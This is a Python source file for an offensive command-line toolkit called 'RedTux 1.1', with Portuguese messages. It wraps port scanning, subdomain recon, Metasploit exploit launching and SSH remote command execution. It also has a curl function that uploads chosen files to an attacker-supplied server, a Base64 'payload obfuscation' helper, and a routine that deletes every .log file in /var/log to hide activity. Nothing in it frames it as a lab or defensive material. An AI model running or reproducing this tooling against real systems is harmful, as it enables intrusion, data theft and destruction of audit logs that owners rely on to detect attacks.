import os
import socket
import base64
import subprocess
import logging
import paramiko
import argparse
from colorama import Fore, Style, init

init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


def recon_subdomains(target):
    try:
        subprocess.run(["sublist3r", "-d", target], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Erro ao executar Sublist3r: {e}")


def port_scan(target, ports=[21, 22, 80, 443]):
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                if s.connect_ex((target, port)) == 0:
                    print(Fore.GREEN + f"[+] Porta {port} aberta")
            except socket.error as e:
                logging.error(f"Erro ao escanear porta {port}: {e}")


def metasploit_rpc(payload, rhost, lhost, lport):
    cmd = f"msfconsole -x 'use exploit/{payload}; set RHOST {rhost}; set LHOST {lhost}; set LPORT {lport}; exploit'"
    subprocess.run(cmd, shell=True)


def exploit_with_pwntools(binary_path):
    print(Fore.YELLOW + "[!] Pwntools está desabilitado nesta versão por falta do módulo 'pwn'.")
    print(Fore.YELLOW + "[!] Instale pwntools com 'pip install pwntools' para usar essa funcionalidade.")


def ssh_exec(target, user, pwd, cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=user, password=pwd, timeout=5)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        output = stdout.read().decode()
        errors = stderr.read().decode()
        print(Fore.GREEN + output)
        if errors:
            print(Fore.YELLOW + "[!] Erros:\n" + errors)
    except paramiko.AuthenticationException:
        logging.error("Falha de autenticação SSH.")
    except Exception as e:
        logging.error(f"Erro na conexão SSH: {e}")
    finally:
        ssh.close()


def smb_enum(target, user, pwd):
    print(Fore.YELLOW + "[!] Funcionalidade SMB indisponível: módulo 'impacket' ausente.")
    print(Fore.YELLOW + "[!] Instale impacket com 'pip install impacket' para usar essa funcionalidade.")


def obfuscate_payload(payload):
    return base64.b64encode(payload.encode()).decode()


def exfiltrate_file(file_path, remote_server):
    if not os.path.exists(file_path):
        logging.error("Arquivo não encontrado para exfiltração.")
        return
    try:
        subprocess.run(["curl", "-F", f"file=@{file_path}", remote_server], check=True)
        logging.info("Arquivo exfiltrado com sucesso.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Erro ao exfiltrar arquivo: {e}")


def limpar_logs():
    try:
        log_dir = "/var/log/"
        for file in os.listdir(log_dir):
            if file.endswith(".log"):
                os.remove(os.path.join(log_dir, file))
        logging.info("Logs limpos com sucesso.")
    except Exception as e:
        logging.error(f"Erro ao limpar logs: {e}")


def main():
    print(Fore.RED + Style.BRIGHT + "\n================ REDTUX 1.1 ================")
    print(Fore.CYAN + "Utilize os parâmetros abaixo para executar funcionalidades específicas:\n")
    print(Fore.YELLOW + "--scan <IP>" + Fore.WHITE + "                → Scan de portas")
    print(Fore.YELLOW + "--recon <DOMINIO>" + Fore.WHITE + "           → Reconhecimento de subdomínios")
    print(Fore.YELLOW + "--payload <STRING>" + Fore.WHITE + "           → Ofuscar string em Base64")
    print(Fore.YELLOW + "--exfil <ARQUIVO> <URL>" + Fore.WHITE + "      → Exfiltrar arquivo para servidor")
    print(Fore.YELLOW + "--clear-logs" + Fore.WHITE + "                → Limpar logs do sistema")
    print(Fore.YELLOW + "--ssh <IP> <USER> <PASS> <CMD>" + Fore.WHITE + " → Executar comando remoto via SSH")
    print(Fore.YELLOW + "--smb <IP> <USER> <PASS>" + Fore.WHITE + "     → Enumerar compartilhamentos SMB")
    print(Fore.YELLOW + "--exploit <BIN>" + Fore.WHITE + "              → Executar exploit com Pwntools")
    print(Fore.YELLOW + "--msf <PAYLOAD> <RHOST> <LHOST> <LPORT>" + Fore.WHITE + " → Executar exploit via Metasploit")
    print(Fore.RED + "============================================\n")

    parser = argparse.ArgumentParser(description="RedTux 1.1")
    parser.add_argument("--scan", metavar="IP", help="Scan de portas no alvo")
    parser.add_argument("--recon", metavar="DOMINIO", help="Reconhecimento de subdomínios")
    parser.add_argument("--payload", metavar="PAYLOAD", help="Ofuscar payload em Base64")
    parser.add_argument("--exfil", nargs=2, metavar=("ARQUIVO", "URL"), help="Exfiltrar arquivo para servidor remoto")
    parser.add_argument("--clear-logs", action="store_true", help="Limpar logs do sistema")
    parser.add_argument("--ssh", nargs=4, metavar=("IP", "USER", "PASS", "CMD"), help="Executar comando remoto via SSH")
    parser.add_argument("--smb", nargs=3, metavar=("IP", "USER", "PASS"), help="Enumerar compartilhamentos SMB")
    parser.add_argument("--exploit", metavar="BIN", help="Executar exploit com Pwntools")
    parser.add_argument("--msf", nargs=4, metavar=("PAYLOAD", "RHOST", "LHOST", "LPORT"), help="Executar exploit via Metasploit")

    args = parser.parse_args()

    if args.scan:
        port_scan(args.scan)
    elif args.recon:
        recon_subdomains(args.recon)
    elif args.payload:
        print(obfuscate_payload(args.payload))
    elif args.exfil:
        exfiltrate_file(args.exfil[0], args.exfil[1])
    elif args.clear_logs:
        limpar_logs()
    elif args.ssh:
        ssh_exec(*args.ssh)
    elif args.smb:
        smb_enum(*args.smb)
    elif args.exploit:
        exploit_with_pwntools(args.exploit)
    elif args.msf:
        metasploit_rpc(*args.msf)
    else:
        print(Fore.RED + "\nModo interativo desabilitado neste ambiente.")
        print(Fore.YELLOW + "Use argumentos CLI para executar funções.")
        print(Fore.YELLOW + "Exemplo: python redtux.py --scan 127.0.0.1")


if __name__ == "__main__":
    main()
